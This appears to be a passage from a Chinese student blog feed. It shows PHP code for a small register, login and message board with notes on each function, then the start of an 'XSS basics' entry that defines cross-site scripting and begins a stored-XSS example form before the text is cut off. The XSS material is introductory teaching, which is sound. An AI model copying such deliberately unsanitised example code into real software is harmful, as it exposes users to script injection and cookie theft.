class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], PASSWORD_BCRYPT);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO users (username, password) values (?, ?)&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>()) &#123;</span><br><span class="line">        <span class="comment">//echo &#x27;Registration successful. &lt;a href=&quot;login.php&quot;&gt;Login&lt;/a&gt;&#x27;;</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Registration failed. Please try again.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;REGISTER&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            background-image: <span class="title function_ invoke__">url</span>(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">            background-size: auto <span class="number">870</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;也许你想要一个账号&lt;/h1&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        你想要个名字：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;</span><br><span class="line">        你又多了个蜜🐎：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点我一下&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;&lt;br&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;login.php&quot;</span>&gt;登入哦&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="学习-1"><a href="#学习-1" class="headerlink" title="学习"></a>学习</h3><p><strong>session_start()<strong>函数开启或恢复会话，之后可以使用</strong>$_SESSION</strong>超全局数组</p><p><strong><code>require_once</code></strong> 是 PHP 中用于包含文件的语句，它确保被包含的文件在整个脚本执行过程中只被包含一次，即使在多个地方调用也不会重复包含。</p><p>password_hash($pwd, method)，使密码哈希化，保证密码安全</p><p>预编译：</p><p>准备：$stmt &#x3D; $conn-&gt;prepare($str);其中变量部分用 <strong>?</strong> 占位</p><p>插入：$stmt-&gt;bind_param(‘model’, var1，···，varn);</p><p>执行：$stmt-&gt;excute();</p><p>绑定：$stmt-&gt;bind_result($a,$b,···);</p><p>传递：$stmt-&gt;fetch;</p><p>关闭：$stmt-&gt;close();</p><p>header(‘Location: example.php’)</p><blockquote><p><code>header()</code> 函数是 PHP 中用于发送原始的 HTTP 头的函数。它通常用于在服务器端发送 HTTP 头信息，如设置重定向、设置页面编码、设置缓存控制等。这些头信息会在服务器响应浏览器请求时一同发送给浏览器。</p><p>基本的语法为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpCopy <span class="selector-tag">code</span></span><br><span class="line"><span class="selector-tag">header</span>(<span class="selector-tag">header</span>, replace, http_response_code);</span><br></pre></td></tr></table></figure><ul><li><strong><code>header</code>：</strong> 要发送的头信息，形式为 “header_name: header_value”。例如，<code>header(&#39;Content-Type: text/html&#39;);</code> 表示设置响应内容的类型为 HTML。</li><li><strong><code>replace</code>：</strong> 一个可选的布尔参数，指示是否替换之前相同头的值。默认是 <code>true</code>，表示替换；如果设置为 <code>false</code>，则会追加到之前相同头的值后面。</li><li><strong><code>http_response_code</code>：</strong> 一个可选的 HTTP 响应状态码。如果提供了该参数，它会替代之前设置的响应状态码。</li></ul></blockquote><h2 id="三-登入账户-login-php"><a href="#三-登入账户-login-php" class="headerlink" title="三.登入账户(login.php)"></a>三.登入账户(login.php)</h2><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT id, username, password FROM users WHERE username=?&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();<span class="comment">//启动</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$id</span>, <span class="variable">$username</span>, <span class="variable">$hash_password</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$hash_password</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: message.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();<span class="comment">//终止脚本运行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;总有一个错了吧，高考不会给你机会哈哈哈哈哈······&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            background-image: <span class="title function_ invoke__">url</span>(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">            background-size: auto <span class="number">870</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;看来你是想进来看看的，帅气的我答应了&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        你有个名字：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">        你的蜜🐎呢：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;点我一下&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;register.php&quot;</span>&gt;注册一个呗&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="学习-2"><a href="#学习-2" class="headerlink" title="学习"></a>学习</h3><p>哈希密码验证：password_verify($password, $hash_password)</p><blockquote><p>语法：bool password_verify ( string $password , string $hash )</p><p>password_verify（） 函数用于验证密码是否和散列值匹配。</p><ul><li>password： 用户的密码。</li><li>散 列： 一个由 <a href="https://www.runoob.com/php/php-password_hash.html">password_hash（）</a> 创建的散列值。</li></ul></blockquote><h2 id="留言-message-php"><a href="#留言-message-php" class="headerlink" title="留言(message.php)"></a>留言(message.php)</h2><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$user_id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$to_user</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;to_user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO messages (user_id, message, to_user, post_user) VALUES (?, ?, ?, ?)&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;isss&#x27;</span>, <span class="variable">$user_id</span>, <span class="variable">$message</span>, <span class="variable">$to_user</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;我记住了&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你失败了，反正不是我的原因&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;MESSAGE&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body&#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        background-image: <span class="title function_ invoke__">url</span>(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">        background-size: auto <span class="number">870</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Welcome, <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);<span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        写给谁：&lt;select name=<span class="string">&quot;to_user&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="variable">$usernames</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT username FROM users&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$usernames</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;option value=&quot;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/select&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;写什么：&lt;/label&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">&quot;message&quot;</span> required&gt;&lt;/textarea&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;h3&gt;康康大家给你的留言&lt;/h3&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$stmt_1</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT message, post_user FROM messages WHERE to_user = ?&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt_1</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$stmt_1</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$stmt_1</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;post_user&#x27;</span>]).<span class="string">&#x27;：&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;message&#x27;</span>]).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h3&gt;公共留言&lt;/h3&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;SELECT message, post_user FROM messages WHERE to_user = &#x27;全部&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;post_user&#x27;</span>]).<span class="string">&#x27;：&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;message&#x27;</span>]).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</span><br><span class="line">    <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;logout.php&quot;</span>&gt;也许你想退出了&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="学习-3"><a href="#学习-3" class="headerlink" title="学习"></a>学习</h3><p>细讲一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$usernames</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT username FROM users&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$usernames</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;option value=&quot;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;/option&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>fetch_assoc()函数：</p><blockquote><p><code>fetch_assoc()</code> 是 PHP 中用于从数据库中获取关联数组的函数。这个函数通常与 MySQLi（MySQL Improved）扩展一起使用，用于执行查询并返回结果集中的下一行作为关联数组。</p></blockquote><p>echo：</p><p>echo可以用来实现PHP与HTML的拼接，因为echo的字符串输出在HTML文档，会执行相关的操作。</p><p>htmlspecialchars()：</p><blockquote><p><code>htmlspecialchars</code> 是一个用于在处理 HTML 输出时防止跨站脚本攻击（XSS）的 PHP 函数。该函数将字符串中的特殊字符转换为对应的 HTML 实体，从而确保这些字符不被解释为 HTML 标记，而是以原始的文本形式显示在页面上。</p></blockquote><h2 id="注销账户-logout-php"><a href="#注销账户-logout-php" class="headerlink" title="注销账户(logout.php)"></a>注销账户(logout.php)</h2><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="学习-4"><a href="#学习-4" class="headerlink" title="学习"></a>学习</h3><ol><li><code>session_start();</code>: 开始或恢复会话。在使用会话功能之前，必须先调用此函数，以确保能够使用 <code>$_SESSION</code> 变量来存储和检索会话数据。</li><li><code>session_unset();</code>: 释放 <code>$_SESSION</code> 变量中的所有会话数据。这并不会结束会话，只是清空会话数据，以确保用户在下次访问时不再保持之前的会话状态。</li><li><code>session_destroy();</code>: 销毁会话。此函数会删除服务器上存储的会话文件，并且将会话 cookie 设置为过期。这意味着当前用户的会话已经结束，下次访问时将会创建一个新的会话。</li><li><code>header(&quot;Location: login.php&quot;);</code>: 发送一个原始的 HTTP 头信息，用于重定向浏览器到指定的 URL（在这里是 <code>login.php</code>）。这会告诉浏览器去访问新的页面。</li><li><code>exit();</code>: 立即终止脚本的执行。在这里，它确保在重定向之后不会执行任何额外的代码。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS入门</title>
      <link href="/2024/03/18/XSS%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/XSS%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="XSS入门"><a href="#XSS入门" class="headerlink" title="XSS入门"></a>XSS入门</h1><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p><strong>推荐文章：<a href="https://xz.aliyun.com/t/12370?time__1311=mqmhD57KAIe+OxBqDTnxUOznD88evwPx&alichlgref=https://xz.aliyun.com/t/12370#tdsub">对于XSS跨站脚本攻击的学习 - 先知社区 (aliyun.com)</a></strong></p><p>原理文章：<a href="https://xz.aliyun.com/t/12890?time__1311=mqmhq+xjhiGKDsD7GY0=bDtRhbpWiYeD&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/12890?time__1311=mqmhq%2BxjhiGKDsD7GY0%3DbDtRhbpWiYeD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跨站脚本攻击（<span class="built_in">Cross</span><span class="operator">-</span><span class="variable">Site</span> <span class="variable">Scripting</span>，<span class="variable">XSS</span>）是一种常见的<span class="variable">Web</span>安全漏洞，攻击者通过在受害者的浏览器中注入恶意脚本来执行恶意行为。这种攻击通常利用<span class="variable">Web</span>应用程序没有对用户输入的数据进行足够的过滤和验证。</span><br></pre></td></tr></table></figure><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XSS跨站脚本攻击的原理是利用Web应用程序对用户输入数据的不足过滤和验证，将恶意脚本注入到受害者的浏览器中，使其在浏览器中执行。</span><br><span class="line">攻击者通常会将恶意脚本嵌入到Web页面中的某个位置，比如输入框、评论框、搜索框等等，然后诱使用户访问这个被注入了恶意脚本的页面。当用户访问页面时，恶意脚本就会在用户的浏览器中被执行，从而执行攻击者预先设定好的恶意行为，比如窃取用户的Cookie信息、伪造用户的网站行为等等。</span><br></pre></td></tr></table></figure><h4 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h4><h5 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h5><p>将代码传输到后端进而到数据库进行储存，再特定情况下实现代码功能。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">    &lt;p&gt;请输入您的评论：&lt;/p&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 处理评论表单的提交</span></span><br><span class="line">    <span 